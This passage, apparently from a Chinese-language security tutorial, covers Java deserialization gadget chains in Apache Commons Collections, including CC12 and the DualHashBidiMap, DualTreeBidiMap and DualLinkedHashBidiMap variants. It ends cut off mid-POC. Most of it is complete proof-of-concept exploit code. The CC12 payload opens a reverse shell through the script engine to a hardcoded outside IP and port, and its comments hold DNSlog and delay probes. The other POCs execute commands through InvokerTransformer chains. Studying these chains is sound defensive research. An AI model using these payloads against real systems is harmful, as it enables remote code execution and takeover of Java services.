<pre><code>ScriptEngine engine = new ScriptEngineManager().getEngineByExtension(&quot;js&quot;);
</code></pre></li>
<li><p>3.&#x901A;&#x8FC7;MIME&#x7C7B;&#x578B;&#x6765;&#x83B7;&#x53D6;&#xFF1A;</p>
<pre><code>ScriptEngine engine = new ScriptEngineManager().getEngineByMimeType(&quot;text/javascript&quot;);
</code></pre></li>
</ul>
<p>&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x8981;&#x548C;js&#x6DF7;&#x7F16;&#x6253;&#x5370;&#x4E00;&#x4E2A;HelloWord&#xFF1A;</p>
<pre><code>ScriptEngineManager manager = new ScriptEngineManager();
ScriptEngine engine = manager.getEngineByName(&quot;JavaScript&quot;);
engine.eval(&quot;println(&apos;Hello Word&apos;);&quot;);
</code></pre><p>&#x5F53;&#x7136;&#x53CD;&#x5C04;&#x7684;&#x5199;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>Class clazz = Class.forName(&quot;javax.script.ScriptEngineManager&quot;);
Object manager = clazz.getDeclaredConstructor().newInstance();
Method getEngineByName = clazz.getDeclaredMethod(&quot;getEngineByName&quot;, String.class);
Object scriptEngine = getEngineByName.invoke(manager,&quot;JavaScript&quot;);
Method eval = scriptEngine.getClass().getMethod(&quot;eval&quot;,String.class);
eval.invoke(scriptEngine,&quot;println(&apos;Hello Word&apos;);&quot;);
</code></pre><p><strong>&#x6CE8;&#x610F;: &#x7531;&#x4E8E;&#x662F;&#x548C;js&#x6DF7;&#x7F16;,&#x6240;&#x4EE5;&#x8981;&#x5145;&#x5206;&#x6CE8;&#x610F;js&#x7684;&#x4E00;&#x4E9B;&#x8BED;&#x6CD5;&#x548C;Java&#x8BED;&#x6CD5;&#x7684;&#x533A;&#x522B;</strong></p>
<ul>
<li><p>1.&#x53D8;&#x91CF;&#x547D;&#x540D;
js&#x662F;&#x5F31;&#x7C7B;&#x578B;&#x7684;&#x8BED;&#x8A00;,&#x6240;&#x6709;&#x53D8;&#x91CF;&#x4F7F;&#x7528;var&#x5373;&#x53EF;,&#x4E14;&#x4E0D;&#x9700;&#x8981;&#x58F0;&#x660E;&#x7C7B;&#x578B;&#x4E5F;&#x4E0D;&#x652F;&#x6301;&#x7C7B;&#x578B;&#x8F6C;&#x6362;.
&#x4F8B;&#x5982; String a &#x548C; int b&#x9700;&#x8981;&#x5199;&#x4E3A;var a &#x548C; var b.</p>
</li>
<li><p>2.&#x5F02;&#x5E38;&#x6355;&#x6349;</p>
<p>&#x5F02;&#x5E38;&#x4E0D;&#x7528;&#x58F0;&#x660E;&#x7C7B;&#x578B;</p>
<p>&#x4F8B;&#x5982;</p>
<pre><code>try{
  var a;
}catch (e){
}
</code></pre></li>
</ul>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> javax.script.ScriptEngineManager;
<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollections12</span> </span>{

<span class="hljs-comment">//    private static String jscmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;;</span>
    <span class="hljs-comment">// DNS&#x6D4B;&#x8BD5;</span>
<span class="hljs-comment">//    private static String u = &quot;http://95s6my.dnslog.cn&quot;;</span>
<span class="hljs-comment">//    private static String jscmd = String.format(&quot;new java.util.HashMap().put(new java.net.URL(\&quot;%s\&quot;), \&quot;2\&quot;);&quot;, u);</span>
    <span class="hljs-comment">// &#x5EF6;&#x65F6;&#x6D4B;&#x8BD5;</span>
<span class="hljs-comment">//    private static String time = &quot;3000&quot;;</span>
<span class="hljs-comment">//    private static String jscmd = String.format(&quot;java.lang.Thread.sleep(%s);&quot;, time);;</span>
    <span class="hljs-comment">// java.net.Socket &#x53CD;&#x5F39;shell</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String host = <span class="hljs-string">&quot;81.70.101.91&quot;</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> port = <span class="hljs-number">8888</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String jscmd = String.format(<span class="hljs-string">&quot;var host = \&quot;%s\&quot;;\n&quot;</span> +
    <span class="hljs-string">&quot;var port = %d;\n&quot;</span> +
    <span class="hljs-string">&quot;var p;\n&quot;</span> +
    <span class="hljs-string">&quot;var os = java.lang.System.getProperty(\&quot;os.name\&quot;).toLowerCase(java.util.Locale.ENGLISH);\n&quot;</span> +
    <span class="hljs-string">&quot;if(os.contains(\&quot;win\&quot;)){\n&quot;</span> +
    <span class="hljs-string">&quot;    p = new java.lang.ProcessBuilder(\&quot;cmd\&quot;).redirectErrorStream(true).start();\n&quot;</span> +
    <span class="hljs-string">&quot;        }else{\n&quot;</span> +
    <span class="hljs-string">&quot;    p = new java.lang.ProcessBuilder(\&quot;sh\&quot;).redirectErrorStream(true).start();\n&quot;</span> +
    <span class="hljs-string">&quot;        }\n&quot;</span> +
    <span class="hljs-string">&quot;var s = new java.net.Socket(host,port);\n&quot;</span> +
    <span class="hljs-string">&quot;var pi = p.getInputStream(),pe = p.getErrorStream(),si = s.getInputStream();\n&quot;</span> +
    <span class="hljs-string">&quot;var po = p.getOutputStream(),so = s.getOutputStream();\n&quot;</span> +
    <span class="hljs-string">&quot;while(!s.isClosed()) {\n&quot;</span> +
    <span class="hljs-string">&quot;while(pi.available()&gt;0) {\n&quot;</span> +
    <span class="hljs-string">&quot;so.write(pi.read());\n&quot;</span> +
    <span class="hljs-string">&quot;}\n&quot;</span> +
    <span class="hljs-string">&quot;while(pe.available()&gt;0) {\n&quot;</span> +
    <span class="hljs-string">&quot;so.write(pe.read());\n&quot;</span> +
    <span class="hljs-string">&quot;}\n&quot;</span> +
    <span class="hljs-string">&quot;while(si.available()&gt;0) {\n&quot;</span> +
    <span class="hljs-string">&quot;po.write(si.read());\n&quot;</span> +
    <span class="hljs-string">&quot;}\n&quot;</span> +
    <span class="hljs-string">&quot;so.flush();\n&quot;</span> +
    <span class="hljs-string">&quot;po.flush();\n&quot;</span> +
    <span class="hljs-string">&quot;java.lang.Thread.sleep(50);\n&quot;</span> +
    <span class="hljs-string">&quot;try {\n&quot;</span> +
    <span class="hljs-string">&quot;p.exitValue();\n&quot;</span> +
    <span class="hljs-string">&quot;break;\n&quot;</span> +
    <span class="hljs-string">&quot;}\n&quot;</span> +
    <span class="hljs-string">&quot;catch (e){\n&quot;</span> +
    <span class="hljs-string">&quot;}\n&quot;</span> +
    <span class="hljs-string">&quot;};\n&quot;</span> +
    <span class="hljs-string">&quot;p.destroy();\n&quot;</span> +
    <span class="hljs-string">&quot;s.close();&quot;</span>, host, port);

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        String[] execArgs = <span class="hljs-keyword">new</span> String[]{jscmd};
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{<span class="hljs-keyword">new</span> ConstantTransformer(ScriptEngineManager.class),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newInstance&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getEngineByName&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class},
                <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;JavaScript&quot;</span>}), <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;eval&quot;</span>,
            <span class="hljs-keyword">new</span> Class[]{String.class}, execArgs), <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};
        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);
        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        <span class="hljs-comment">// &#x8C03;&#x7528;decorate&#x4E3B;&#x8981;&#x662F;&#x76F4;&#x63A5;&#x5199;&#x5165;&#x7684;&#x65B9;&#x6CD5;&#x662F;protected, &#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x6743;&#x9650;&#x624D;&#x884C;, &#x800C;&#x8BE5;&#x65B9;&#x6CD5;&#x662F;public</span>
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;ricky&quot;</span>);
        <span class="hljs-comment">/*jdk1.8*/</span>
        HashSet hashSet = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);
        hashSet.add(tiedMapEntry);
        outerMap.remove(<span class="hljs-string">&quot;ricky&quot;</span>);

        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        Field f = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(chainedTransformer, transformers);

        <span class="hljs-keyword">try</span>{
            <span class="hljs-comment">// serialize</span>
            ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
            ObjectOutputStream objectoutputstream = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
            objectoutputstream.writeObject(hashSet);
            objectoutputstream.close();
            <span class="hljs-comment">// unserialize</span>
            ObjectInputStream objectinputstream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
            objectinputstream.readObject();
            objectinputstream.close();
            System.out.println(Base64.encodeBase64String(barr.toByteArray()));
        }<span class="hljs-keyword">catch</span>(Exception e){
            e.printStackTrace();
        }
    }
}
</code></pre>
<h2 id="cc13">CC13</h2>
<p>&#x53C2;&#x8003;: <a href="https://forum.butian.net/share/1233" target="_blank">https://forum.butian.net/share/1233</a></p>
<h3 id="commoncollections-dualtreebidimap">CommonCollections DualTreeBidiMap</h3>
<p>&#x5229;&#x7528;&#x94FE;&#x7684;&#x89E6;&#x53D1;&#x70B9;&#x662F;&#x5728; org.apache.commons.collections.bidimap.DualHashBidiMap &#x7C7B;&#x7684;readObject&#x65B9;&#x6CD5;, &#x5728;readObject&#x65B9;&#x6CD5;&#x4E2D;&#x8C03;&#x7528;&#x4E86;putAll&#x65B9;&#x6CD5;&#xFF0C;&#x4F20;&#x5165;&#x7684;map&#x53C2;&#x6570;&#x662F;&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5F97;&#x5230;&#x7684;</p>
<pre><code>    public void putAll(Map map) {
        for (Iterator it = map.entrySet().iterator(); it.hasNext();) {
            Map.Entry entry = (Map.Entry) it.next();
            put(entry.getKey(), entry.getValue());
        }
    }
</code></pre><p>&#x901A;&#x8FC7;put&#x5BF9;&#x8C61;&#x4E2D;&#x7684; containsKey</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">put</span><span class="hljs-params">(Object key, Object value)</span> </span>{
        <span class="hljs-keyword">if</span> (maps[<span class="hljs-number">0</span>].containsKey(key)) {
            maps[<span class="hljs-number">1</span>].remove(maps[<span class="hljs-number">0</span>].get(key));
        }
        <span class="hljs-keyword">if</span> (maps[<span class="hljs-number">1</span>].containsKey(value)) {
            maps[<span class="hljs-number">0</span>].remove(maps[<span class="hljs-number">1</span>].get(value));
        }
        <span class="hljs-keyword">final</span> Object obj = maps[<span class="hljs-number">0</span>].put(key, value);
        maps[<span class="hljs-number">1</span>].put(value, key);
        <span class="hljs-keyword">return</span> obj;
    }
</code></pre>
<p>&#x63A7;&#x5236;map[0]&#x4E3A;TiedMapEntry&#x5BF9;&#x8C61;,  &#x5728;containsKey&#x65B9;&#x6CD5;&#x4E2D;&#x4F1A;&#x8C03;&#x7528;<code>hash(key)</code> &#x65B9;&#x6CD5;&#x8BA1;&#x7B97;&#x4F20;&#x5165;&#x7684;key&#x7684;hash, &#x800C;&#x5728;hash&#x65B9;&#x6CD5;&#x4E2D;&#x4F1A;&#x8C03;&#x7528;<code>key.hashCode()</code>&#x65B9;&#x6CD5;&#x89E6;&#x53D1;</p>
<pre><code>    public boolean containsKey(Object key) {
        return getNode(hash(key), key) != null;
    }
</code></pre><p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.collections.BidiMap;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC13_DualHashBidiMap</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] {
            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class, Class[].class }, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] }),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] {Object.class, Object[].class }, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] }),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class }, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-string">&quot;calc.exe&quot;</span>}),
            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)
        };
        Transformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);
        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;1&quot;</span>);
        Map&lt;String, Object&gt; expMap = <span class="hljs-keyword">new</span> HashMap&lt;String, Object&gt;();
        expMap.put(<span class="hljs-string">&quot;2&quot;</span>, tiedMapEntry);

        <span class="hljs-comment">// &#x63A7;&#x5236;map[0]&#x4E3A;TiedMapEntry&#x5BF9;&#x8C61;</span>
        Class clazz = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.bidimap.DualHashBidiMap&quot;</span>);
        Constructor constructor = clazz.getDeclaredConstructor(Map.class, Map.class, BidiMap.class);
        constructor.setAccessible(<span class="hljs-keyword">true</span>);
        Object dualHashBidiMap = constructor.newInstance(expMap, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);

        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        Field f = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(chainedTransformer, transformers);

        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);
        oos.writeObject(dualHashBidiMap);

        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);
        ois.readObject();
    }
}
</code></pre>
<h3 id="commoncollections4-dualtreebidimap">CommonCollections4 DualTreeBidiMap</h3>
<p>&#x89E6;&#x53D1;&#x70B9;&#x662F;&#x5728;org.apache.commons.collections4.bidimap.DualTreeBidiMap&#x7C7B;&#x7684;readObject&#x65B9;&#x6CD5;&#xFF0C;&#x540C;&#x6837;&#x662F;&#x8C03;&#x7528;&#x4E86;putAll&#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x4E14;DualTreeBidiMap&#x7C7B;&#x540C;&#x6837;&#x662F;&#x7EE7;&#x627F;&#x81EA;AbstractDualBidiMap&#x62BD;&#x8C61;&#x7C7B; </p>
<pre><code>    public void putAll(final Map&lt;? extends K, ? extends V&gt; map) {
        for (final Map.Entry&lt;? extends K, ? extends V&gt; entry : map.entrySet()) {
            put(entry.getKey(), entry.getValue());
        }
    }
</code></pre><p>&#x76F4;&#x63A5;&#x6765;&#x770B;put&#x65B9;&#x6CD5;&#x7684;&#x5B9A;&#x4E49;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x5229;&#x7528;&#x70B9;&#x4E0D;&#x518D;&#x662F;containsKey&#x65B9;&#x6CD5;&#xFF0C;&#x56E0;&#x4E3A;&#x5728;readObject&#x65B9;&#x6CD5;&#x4E2D;<code>this.normalMap</code>&#x548C;<code>this.reverseMap</code>&#x662F;&#x88AB;&#x8D4B;&#x503C;&#x4E3A;&#x7A7A;&#x7684;TreeMap&#x5BF9;&#x8C61;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x6CD5;&#x518D;&#x5229;&#x7528;&#xFF0C;&#x4E0D;&#x8FC7;&#x5728;&#x4E0B;&#x9762;&#x8C03;&#x7528;&#x4E86;<code>this.normalMap</code>&#x548C;<code>this.reverseMap</code>&#x5BF9;&#x8C61;&#x7684;put&#x65B9;&#x6CD5;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;TreeMap&#x7684;put&#x65B9;&#x6CD5; </p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-keyword">final</span> K key, <span class="hljs-keyword">final</span> V value)</span> </span>{
        <span class="hljs-keyword">if</span> (normalMap.containsKey(key)) {
            reverseMap.remove(normalMap.get(key));
        }
        <span class="hljs-keyword">if</span> (reverseMap.containsKey(value)) {
            normalMap.remove(reverseMap.get(value));
        }
        <span class="hljs-keyword">final</span> V obj = normalMap.put(key, value);
        reverseMap.put(value, key);
        <span class="hljs-keyword">return</span> obj;
    }
</code></pre>
<p>&#x5728;TreeMap&#x7684;put&#x65B9;&#x6CD5;&#x4E2D;&#x4F1A;&#x8C03;&#x7528;compare&#x65B9;&#x6CD5;, &#x800C;&#x5728;compare&#x65B9;&#x6CD5;&#x4E2D;&#x53C8;&#x4F1A;&#x8C03;&#x7528;&#x6210;&#x5458;&#x53D8;&#x91CF;comparator&#x7684;compare&#x65B9;&#x6CD5;&#x5982;&#x679C;&#x80FD;&#x63A7;&#x5236;&#x8FD9;&#x91CC;&#x7684;comparator&#x4E3A;TransformingComparator&#x5BF9;&#x8C61;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x540E;&#x534A;&#x90E8;&#x5206;&#x5229;&#x7528;&#x94FE;&#x7684;&#x6784;&#x9020;&#xFF0C;&#x56E0;&#x4E3A;&#x7528;&#x5230;&#x4E86;TransformingComparator&#x7C7B;&#xFF0C;&#x800C;TransformingComparator&#x7C7B;&#x5728;Commons Collections 4.0&#x7248;&#x672C;&#x4E0B;&#x5B9E;&#x73B0;&#x4E86;Serializable&#x63A5;&#x53E3;&#xFF0C;&#x6240;&#x4EE5;&#x8BE5;&#x5229;&#x7528;&#x94FE;&#x5728;CommonsCollections  4.0&#x7248;&#x672C;&#x4E0B;&#x624D;&#x53EF;&#x5229;&#x7528;, DualTreeBidiMap&#x5BF9;&#x8C61;&#x7684;&#x6210;&#x5458;&#x53D8;&#x91CF;comparator&#x5728;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x4E2D;&#x662F;&#x901A;&#x8FC7;&#x4F20;&#x5165;&#x7684;keyComparator&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x8D4B;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x662F;&#x53EF;&#x63A7;&#x7684;  </p>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.bidimap.DualTreeBidiMap;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;

<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC14_DualTreeBidiMap</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] {
            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class, Class[].class }, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] }),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] {Object.class, Object[].class }, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] }),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class }, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-string">&quot;calc.exe&quot;</span>}),
            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)
        };

        Transformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>));
        TransformingComparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);
        DualTreeBidiMap dualTreeBidiMap = <span class="hljs-keyword">new</span> DualTreeBidiMap(comparator, comparator);
        dualTreeBidiMap.put(<span class="hljs-string">&quot;demo&quot;</span>, <span class="hljs-string">&quot;demo&quot;</span>);

        Field field = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        field.setAccessible(<span class="hljs-keyword">true</span>);
        field.set(chainedTransformer, transformers);

        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);
        oos.writeObject(dualTreeBidiMap);

        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);
        ois.readObject();
    }
}
</code></pre>
<h3 id="commoncollections4-duallinkedhashbidimap">CommonCollections4 DualLinkedHashBidiMap</h3>
<p>&#x540C;&#x7406;CommonCollections DualTreeBidiMap, POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.bidimap.DualLinkedHashBidiMap;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.map.LazyMap;

<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC13_DualLinkedHashBidiMap</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] {
            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class, Class[].class }, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] }),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] {Object.class, Object[].class }, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] }),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class }, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-string">&quot;calc.exe&quot;</span>}),
            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)
        };

        Transformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);
        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        LazyMap lazyMap = LazyMap.lazyMap(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;1&quot;</span>);
        Map expMap = <span class="hljs-keyword">new</span> HashMap();
        expMap.put(<span class="hljs-string">&quot;2&quot;</span>, tiedMapEntry);

